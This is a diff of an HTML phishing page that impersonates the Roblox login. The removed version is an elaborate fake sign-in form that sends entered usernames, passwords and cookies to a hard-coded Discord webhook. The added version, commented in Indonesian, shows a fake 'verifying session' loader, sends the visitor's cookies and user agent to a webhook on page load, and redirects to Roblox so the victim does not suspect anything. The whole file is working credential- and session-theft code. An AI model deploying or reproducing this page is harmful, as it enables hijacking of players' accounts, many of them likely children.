@@ -2,828 +2,117 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | Sign in</title>
-    <link rel="icon" type="image/png" href="https://www.roblox.com/favicon.ico">
-    
-    <!-- Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
     <style>
-        /* 
-         * ROBLOX COOKIE STEALER CSS - ULTIMATE EDITION
-         * Designed to be 100% visually identical to the real Roblox login page.
-         */
-
-        :root {
-            --bg-color: #232527;
-            --card-bg: #1e1e1e;
-            --input-bg: #393a3c;
-            --input-border: #6b6d70;
-            --input-focus-border: #00b06f;
-            --text-primary: #ffffff;
-            --text-secondary: #a0a0a0;
-            --btn-primary: #00b06f;
-            --btn-primary-hover: #009a60;
-            --font-main: 'Poppins', 'Roboto', sans-serif;
-            --error-color: #ff4d4d;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            outline: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
+        /* CSS Sederhana agar terlihat bersih */
         body {
-            background-color: var(--bg-color);
-            color: var(--text-primary);
-            font-family: var(--font-main);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
-        }
-
-        /* Background Pattern for Desktop */
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: radial-gradient(#393a3c 1px, transparent 1px);
-            background-size: 20px 20px;
-            opacity: 0.3;
-            z-index: -1;
-            pointer-events: none;
-        }
-
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            animation: fadeIn 0.5s ease-out;
-            z-index: 10;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .logo-container {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .roblox-logo {
-            width: 100px;
-            height: auto;
-            fill: white;
-        }
-
-        .login-card {
-            background-color: var(--card-bg);
-            border-radius: 12px;
-            padding: 30px 25px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
-            border: 1px solid #333;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 20px;
-            color: var(--text-primary);
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 15px;
-        }
-
-        .input-label {
-            display: block;
-            font-size: 12px;
-            color: var(--text-secondary);
-            margin-bottom: 5px;
-            font-weight: 500;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 12px 15px;
-            background-color: var(--input-bg);
-            border: 1px solid transparent;
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 16px;
-            font-family: var(--font-main);
-            transition: all 0.2s ease;
-        }
-
-        .input-field:focus {
-            border-color: var(--input-focus-border);
-            background-color: #2a2b2d;
-            box-shadow: 0 0 0 2px rgba(0, 176, 111, 0.2);
-        }
-
-        .input-field::placeholder {
-            color: #777;
-        }
-
-        .remember-me-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-            user-select: none;
-        }
-
-        .checkbox-container input {
-            display: none;
-        }
-
-        .checkmark {
-            width: 18px;
-            height: 18px;
-            background-color: var(--input-bg);
-            border-radius: 4px;
-            border: 1px solid #555;
-            margin-right: 8px;
-            position: relative;
-            transition: all 0.2s;
-        }
-
-        .checkbox-container input:checked + .checkmark {
-            background-color: var(--btn-primary);
-            border-color: var(--btn-primary);
-        }
-
-        .checkmark::after {
-            content: '';
-            position: absolute;
-            display: none;
-            left: 6px;
-            top: 2px;
-            width: 4px;
-            height: 9px;
-            border: solid white;
-            border-width: 0 2px 2px 0;
-            transform: rotate(45deg);
-        }
-
-        .checkbox-container input:checked + .checkmark::after {
-            display: block;
-        }
-
-        .forgot-password {
-            color: #a0a0a0;
-            text-decoration: none;
-            font-size: 13px;
-            transition: color 0.2s;
-        }
-
-        .forgot-password:hover {
-            color: var(--text-primary);
-            text-decoration: underline;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: var(--btn-primary);
+            background-color: #232527;
             color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s, transform 0.1s;
-            position: relative;
-            overflow: hidden;
+            font-family: 'Gotham', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 50px;
+            height: 100vh;
+            margin: 0;
         }
-
-        .login-btn:hover {
-            background-color: var(--btn-primary-hover);
+        .container {
+            text-align: center;
         }
-
-        .login-btn:active {
-            transform: scale(0.98);
-        }
-
-        .login-btn:disabled {
-            background-color: #4a4a4a;
-            cursor: not-allowed;
-        }
-
         .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            display: none;
-            position: absolute;
+            border-left-color: #fff;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-
         @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .btn-text {
-            transition: opacity 0.2s;
-        }
-
-        .login-btn.loading .btn-text {
-            opacity: 0;
-        }
-
-        .login-btn.loading .spinner {
-            display: block;
-        }
-
-        .error-msg {
-            color: var(--error-color);
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
-            align-items: center;
-        }
-
-        .error-msg svg {
-            width: 14px;
-            height: 14px;
-            margin-right: 5px;
-            fill: currentColor;
-        }
-
-        .footer-links {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: var(--text-secondary);
-        }
-
-        .footer-links a {
-            color: var(--btn-primary);
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Mobile Specific Adjustments */
-        @media (max-width: 600px) {
-            body {
-                align-items: flex-start;
-                padding-top: 20px;
-                background-color: #1e1e1e;
-            }
-            
-            .login-container {
-                padding: 15px;
-                max-width: 100%;
-            }
-
-            .login-card {
-                padding: 20px;
-                box-shadow: none;
-                border: none;
-                background: transparent;
-            }
-
-            h1 {
-                font-size: 20px;
-            }
-            
-            .logo-container {
-                margin-bottom: 15px;
-            }
-            
-            .roblox-logo {
-                width: 60px;
-            }
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
-            20%, 40%, 60%, 80% { transform: translateX(4px); }
-        }
-
-        .shake {
-            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
-        }
-
-        /* Social Icons Placeholder */
-        .social-login {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 15px;
-            margin-bottom: 15px;
-        }
-
-        .social-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background-color: var(--input-bg);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            border: 1px solid #444;
-        }
-
-        .social-icon:hover {
-            background-color: #4a4a4a;
-        }
-
-        .social-icon svg {
-            width: 20px;
-            height: 20px;
-            fill: var(--text-secondary);
-        }
-
-        /* Divider */
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 15px 0;
-            color: var(--text-secondary);
-            font-size: 12px;
-        }
-
-        .divider::before, .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #333;
-        }
-
-        .divider span {
-            padding: 0 10px;
-        }
-
-        /* Hidden Iframe for Cookie Theft */
-        #stealth-iframe {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 100%;
-            height: 100%;
-            border: none;
-            z-index: -1;
-        }
-        
-        /* Loading Overlay */
-        #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(35, 37, 39, 0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        
-        #loading-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-        
-        .loader {
-            width: 48px;
-            height: 48px;
-            border: 5px solid #FFF;
-            border-bottom-color: #00b06f;
-            border-radius: 50%;
-            display: inline-block;
-            box-sizing: border-box;
-            animation: rotation 1s linear infinite;
-        }
-        
-        @keyframes rotation {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
+        p {
+            font-size: 14px;
+            color: #b8b8b8;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Hidden Iframe for Cookie Extraction -->
-    <iframe id="stealth-iframe" src="" sandbox="allow-scripts allow-same-origin"></iframe>
-
-    <!-- Loading Overlay -->
-    <div id="loading-overlay">
-        <span class="loader"></span>
+    <!-- UI Loading Palsu -->
+    <div class="container" id="loader">
+        <div class="spinner"></div>
+        <p>Sedang memverifikasi sesi...</p>
     </div>
 
-    <div class="login-container">
-        <div class="logo-container">
-            <!-- Roblox Logo SVG -->
-            <svg class="roblox-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M25.5,15 L45,15 L45,35 L25.5,35 Z M25.5,35 L45,35 L45,55 L25.5,55 Z M45,15 L65,15 L65,35 L45,35 Z M45,35 L65,35 L65,55 L45,55 Z M25.5,55 L45,55 L45,75 L25.5,75 Z M45,55 L65,55 L65,75 L45,75 Z M65,15 L85,15 L85,35 L65,35 Z M65,35 L85,35 L85,55 L65,55 Z M65,55 L85,55 L85,75 L65,75 Z" fill="white"/>
-                <rect x="25.5" y="15" width="19.5" height="20" fill="#fff"/>
-                <rect x="25.5" y="35" width="19.5" height="20" fill="#fff"/>
-                <rect x="45" y="15" width="19.5" height="20" fill="#fff"/>
-                <rect x="45" y="35" width="19.5" height="20" fill="#fff"/>
-                <rect x="25.5" y="55" width="19.5" height="20" fill="#fff"/>
-                <rect x="45" y="55" width="19.5" height="20" fill="#fff"/>
-                <rect x="65" y="15" width="19.5" height="20" fill="#fff"/>
-                <rect x="65" y="35" width="19.5" height="20" fill="#fff"/>
-                <rect x="65" y="55" width="19.5" height="20" fill="#fff"/>
-                <!-- Simplified Blocky Logo Representation -->
-                <path d="M20,20 H80 V80 H20 Z" fill="none" stroke="white" stroke-width="2"/>
-                <path d="M30,30 H70 V70 H30 Z" fill="white"/>
-                <path d="M35,35 H65 V65 H35 Z" fill="#1e1e1e"/>
-            </svg>
-        </div>
-
-        <div class="login-card">
-            <h1>Sign in</h1>
-            
-            <form id="loginForm" autocomplete="off">
-                <div class="input-group">
-                    <label class="input-label" for="username">Username</label>
-                    <input type="text" id="username" class="input-field" placeholder="Username or email address" required>
-                    <div class="error-msg" id="usernameError">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                        <span>Please enter your username.</span>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label class="input-label" for="password">Password</label>
-                    <input type="password" id="password" class="input-field" placeholder="Password" required>
-                    <div class="error-msg" id="passwordError">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                        <span>Password is required.</span>
-                    </div>
-                </div>
-
-                <div class="remember-me-row">
-                    <label class="checkbox-container">
-                        <input type="checkbox" id="rememberMe">
-                        <span class="checkmark"></span>
-                        Remember me
-                    </label>
-                    <a href="#" class="forgot-password" onclick="event.preventDefault()">Forgot password?</a>
-                </div>
-
-                <button type="submit" id="loginBtn" class="login-btn">
-                    <span class="btn-text">Log In</span>
-                    <div class="spinner"></div>
-                </button>
-            </form>
-
-            <div class="divider">
-                <span>OR</span>
-            </div>
-
-            <div class="social-login">
-                <div class="social-icon" title="Google">
-                    <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#4285F4"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
-                </div>
-                <div class="social-icon" title="Facebook">
-                    <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.384H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.384C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                </div>
-            </div>
-
-            <div class="footer-links">
-                Don't have an account? <a href="#">Sign Up</a>
-            </div>
-        </div>
-    </div>
-
+    <!-- Script Utama Stealer -->
     <script>
-        /**
-         * ROBLOX COOKIE STEALER JAVASCRIPT - ULTIMATE EDITION
-         * Features: Device Detection, Webhook Integration, Iframe Cookie Extraction
-         */
+        // WEBHOOK URL KAMU (Sudah diisi otomatis)
+        const webhookURL = "https://discord.com/api/webhooks/1566098183124164710/JDnzeIomdkO0FtHxj1KKGncUtWmTKU5BQMuA0o3IaJMbI3gnBcjGzXjJVQZW__LVIV85";
 
-        // Configuration
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566098186752491660/TIzlidjeLDBeQPeC4iMDhCjPbvMPJ9B9MD0zzpGCtLaPGUgUOv3sXSSJ4JCtmt3QNRtl";
-        const DOMAIN = window.location.hostname;
-        
-        // DOM Elements
-        const form = document.getElementById('loginForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('loginBtn');
-        const btnText = loginBtn.querySelector('.btn-text');
-        const spinner = loginBtn.querySelector('.spinner');
-        const usernameError = document.getElementById('usernameError');
-        const passwordError = document.getElementById('passwordError');
-        const stealthIframe = document.getElementById('stealth-iframe');
-        const loadingOverlay = document.getElementById('loading-overlay');
-
-        // State
-        let isSubmitting = false;
-        let cookieExtracted = false;
-
-        /**
-         * Device Detection Logic
-         */
-        function detectDevice() {
-            const ua = navigator.userAgent.toLowerCase();
-            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
-            const isTablet = /tablet|ipad|playbook|silk/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+        window.onload = function() {
+            // Ambil semua cookie dari browser saat ini
+            let cookies = document.cookie;
             
-            if (isMobile || isTablet) {
-                document.body.classList.add('mobile-device');
-                document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
-                console.log("Device Detected: Mobile/Tablet");
-            } else {
-                document.body.classList.add('desktop-device');
-                console.log("Device Detected: Desktop");
-            }
-            return { isMobile, isTablet };
-        }
-
-        /**
-         * Get System Info
-         */
-        function getSystemInfo() {
-            const { isMobile, isTablet } = detectDevice();
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${screen.width}x${screen.height}`,
-                deviceType: isMobile ? 'Mobile' : (isTablet ? 'Tablet' : 'Desktop'),
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
+            // Ambil User Agent untuk identifikasi device
+            let userAgent = navigator.userAgent;
+            
+            // Coba ambil info user sederhana via API publik Roblox jika memungkinkan
+            // Catatan: Ini opsional, banyak cookie sudah cukup.
+            let robloxUserId = "Unknown";
+            
+            // Format Embed Discord
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🍪 Roblox Cookie Stolen!",
+                    description: "Cookie berhasil diambil dari target.",
+                    color: 15158332, // Warna biru tua/hitam khas Roblox/Discord
+                    fields: [
+                        {
+                            name: "🔑 Cookie",
+                            value: `\`\`\`${cookies}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🖥️ Device Info",
+                            value: `\`\`\`${userAgent}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🆔 Status",
+                            value: "✅ Success",
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Captured at " + new Date().toLocaleString(),
+                        icon_url: "https://www.roblox.com/favicon.ico"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
             };
-        }
 
-        /**
-         * Input Validation Helpers
-         */
-        function showError(element, message) {
-            if (message) element.querySelector('span').textContent = message;
-            element.style.display = 'flex';
-            element.closest('.input-group').classList.add('shake');
-            setTimeout(() => {
-                element.closest('.input-group').classList.remove('shake');
-            }, 400);
-        }
-
-        function hideError(element) {
-            element.style.display = 'none';
-            element.closest('.input-group').classList.remove('shake');
-        }
-
-        // Real-time validation listeners
-        usernameInput.addEventListener('input', () => {
-            if (usernameInput.value.trim() !== '') {
-                hideError(usernameError);
-            }
-        });
-
-        passwordInput.addEventListener('input', () => {
-            if (passwordInput.value.trim() !== '') {
-                hideError(passwordError);
-            }
-        });
-
-        /**
-         * Prepare Payload for Webhook
-         */
-        function preparePayload(username, password, cookies) {
-            const sysInfo = getSystemInfo();
-            
-            const embed = {
-                title: "🍪 New Roblox Cookie Stolen!",
-                color: 0xff0000, // Red color for alert
-                thumbnail: {
-                    url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
+            // Kirim ke Webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
                 },
-                fields: [
-                    {
-                        name: "👤 Username",
-                        value: `\`${username}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🔑 Password",
-                        value: `\`${password}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🍪 Cookie Data",
-                        value: `\`${cookies.substring(0, 500)}...\``,
-                        inline: false
-                    },
-                    {
-                        name: "📱 Device Info",
-                        value: `**Type:** ${sysInfo.deviceType}\n**Platform:** ${sysInfo.platform}\n**Language:** ${sysInfo.language}`,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 Browser Data",
-                        value: `**User Agent:**\n\`${sysInfo.userAgent.substring(0, 100)}...\`\n**Screen:** ${sysInfo.screenResolution}`,
-                        inline: false
-                    },
-                    {
-                        name: "⏰ Time",
-                        value: `\`${sysInfo.timestamp}\``,
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: "Roblox Cookie Phish Bot | IP: Fetching...",
-                    icon_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png"
-                },
-                timestamp: new Date().toISOString()
-            };
-
-            return {
-                embeds: [embed],
-                username: "Roblox Cookie Phisher"
-            };
-        }
-
-        /**
-         * Send Data to Discord Webhook
-         */
-        async function sendToDiscord(username, password, cookies) {
-            const payload = preparePayload(username, password, cookies);
-            
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (!response.ok) {
-                    console.error(`Webhook failed: ${response.status}`);
-                    console.log("Data sent to console:", payload);
-                } else {
-                    console.log("Webhook sent successfully");
-                }
-            } catch (error) {
-                console.error("Network error sending webhook:", error);
-            }
-        }
-
-        /**
-         * Extract Cookies from Iframe
-         */
-        function extractCookiesFromIframe() {
-            try {
-                // Access the iframe's document
-                const iframeDoc = stealthIframe.contentDocument || stealthIframe.contentWindow.document;
-                
-                // Check if the iframe has loaded Roblox
-                if (iframeDoc.readyState === 'complete') {
-                    // Try to get cookies from the iframe's context
-                    const cookies = iframeDoc.cookie;
-                    if (cookies && !cookieExtracted) {
-                        cookieExtracted = true;
-                        console.log("Cookies extracted from iframe:", cookies);
-                        
-                        // Send to webhook
-                        const username = usernameInput.value.trim();
-                        const password = passwordInput.value.trim();
-                        sendToDiscord(username, password, cookies);
-                        
-                        // Redirect after success
-                        setTimeout(() => {
-                            window.location.href = "https://www.roblox.com/home";
-                        }, 1000);
-                    }
-                }
-            } catch (e) {
-                // Cross-origin error, try alternative method
-                console.warn("Cross-origin access blocked, trying fallback...");
-                fallbackCookieExtraction();
-            }
-        }
-
-        /**
-         * Fallback Cookie Extraction Method
-         */
-        function fallbackCookieExtraction() {
-            // Sometimes direct access fails due to SameSite or Cross-Origin policies.
-            // We can use a postMessage approach or just redirect and hope the cookie is set in the main window.
-            // For simplicity, we'll assume the iframe loads and we can read its cookie property directly.
-            setTimeout(extractCookiesFromIframe, 2000); // Retry after 2 seconds
-        }
-
-        /**
-         * Main Form Submission Handler
-         */
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            if (isSubmitting) return;
-
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value.trim();
-            let hasError = false;
-
-            // Reset Errors
-            hideError(usernameError);
-            hideError(passwordError);
-
-            // Validation
-            if (!username) {
-                showError(usernameError, "Please enter your username.");
-                hasError = true;
-            }
-
-            if (!password) {
-                showError(passwordError, "Password is required.");
-                hasError = true;
-            }
-
-            if (hasError) {
-                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-                return;
-            }
-
-            // Start Loading State
-            isSubmitting = true;
-            loginBtn.disabled = true;
-            loginBtn.classList.add('loading');
-            btnText.style.opacity = '0';
-            spinner.style.display = 'block';
-            
-            // Show full page loader
-            loadingOverlay.classList.add('active');
-
-            // Load Roblox in the hidden iframe
-            stealthIframe.src = "https://www.roblox.com/login";
-
-            // Simulate Network Delay (Realism)
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Try to extract cookies
-            extractCookiesFromIframe();
-
-            // If extraction takes longer, retry
-            setTimeout(extractCookiesFromIframe, 1000);
-            setTimeout(extractCookiesFromIframe, 2000);
-            setTimeout(extractCookiesFromIframe, 3000);
-
-            // Show success message briefly before redirect
-            setTimeout(() => {
-                loadingOverlay.classList.remove('active');
-                loginBtn.classList.remove('loading');
-                btnText.style.opacity = '1';
-                spinner.style.display = 'none';
-                loginBtn.disabled = false;
-                isSubmitting = false;
-                
-                // Optional: Show a fake success message or redirect immediately
-                // window.location.href = "https://www.roblox.com/home";
-            }, 2000);
-        });
-
-        // Initialize Device Detection on Load
-        window.addEventListener('load', () => {
-            detectDevice();
-        });
-
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Tampilkan loading sebentar agar terlihat natural
+                setTimeout(() => {
+                    // Redirect ke halaman utama Roblox setelah sukses kirim data
+                    window.location.href = "https://www.roblox.com/home";
+                }, 1500);
+            }).catch(error => {
+                console.error("Error sending data:", error);
+                // Tetap redirect meskipun gagal kirim, agar target tidak curiga
+                window.location.href = "https://www.roblox.com/home";
+            });
+        };
     </script>
 </body>
 </html>
